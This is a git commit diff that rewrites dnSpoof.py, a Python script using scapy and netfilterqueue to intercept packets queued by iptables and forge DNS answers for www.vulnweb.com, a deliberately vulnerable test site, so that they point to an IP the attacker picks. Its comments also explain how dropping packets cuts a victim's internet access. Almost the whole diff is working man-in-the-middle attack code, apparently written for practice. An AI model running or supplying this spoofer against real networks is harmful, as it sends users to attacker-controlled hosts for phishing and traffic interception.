a53c4f70b862c41abecafb38d03103cedc69c985
gkb-os <90243301+gkb-os@users.noreply.github.com>
2021-10-19 03:24:12 +0530

    Update dnSpoof.py

--- dnSpoof.py
+++ dnSpoof.py
@@ -1,23 +1,36 @@
-import netfilterqueue
-import scapy.all as scapy 
+#!/usr/bin/env python
 import subprocess
+import scapy.all as scapy
+import netfilterqueue
 
-#subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0")
-#ubprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
-try:
-    def process_packet(packet):
-        s_pkt= scapy.IP(packet.get_payload())
-        if s_pkt.haslayer(scapy.Raw):
-            if s_pkt[scapy.TCP].dport == 80:
-                print(s_pkt.show())
-            elif s_pkt[scapy.TCP].sport == 80:
-                print(s_pkt.show())
+#subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num 0"]) #  //YOU CAN CALL THIS COMMAND HERE OR MANUALLY TYPE IT IN THE TERMINAL
+#subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0") #   // TO TEST ON HOME NETWORK (OWN IP/127.0.0.1)
+#subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0") #   // TO TEST ON HOME NETWORK
+#subprocess.call("iptables --flush")                              // USE THIS TO RESET IPTABLES RULES
 
-        packet.accept()                                   
+def process_packet(packet):
+    scapy_pkt = scapy.IP(packet.get_payload()) #                // TO ENCAPSULATE THE PAYLOAD IN SCAPY TO MODIFY WITH EASE
+    if scapy_pkt.haslayer(scapy.DNSRR):        #               // TO CHECK IF THE PACKET HAS DNS LAYER
+        qname = scapy_pkt[scapy.DNSQR].qname 
+        if "www.vulnweb.com" in qname.decode():
+            print("--> Spoofing Target")
+            answer= scapy.DNSRR(rrname=qname, rdata="") #    // RDATA = IP WE WANT 
+            scapy_pkt[scapy.DNS].an = answer
+            scapy_pkt[scapy.DNS].ancount = 1
+        else:
+            print("NOT PRESENT")
 
-    queue = netfilterqueue.NetfilterQueue()
-    queue.bind(0, process_packet)
-    queue.run()
+    del scapy_pkt[scapy.IP].len
+    del scapy_pkt[scapy.IP].chksum
+    del scapy_pkt[scapy.UDP].len
+    del scapy_pkt[scapy.UDP].chksum
 
-except KeyboardInterrupt:
-    print("[+] Ctrl^C was pressed.... Stopping!")
+    packet.set_payload(bytes(scapy_pkt))
+    #print(scapy_pkt.show())                                // TO SEE DETAILS OF A SCAPY PACKET
+    #print(packet.get_payload())                           // TO SEE DETAILS OF A PACKET
+    packet.accept() #                                     // TO FORWARD PACKETS
+    #packet.drop()                                       // TO DROP THE PACKET CUTTING INTERNET ACCESS
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
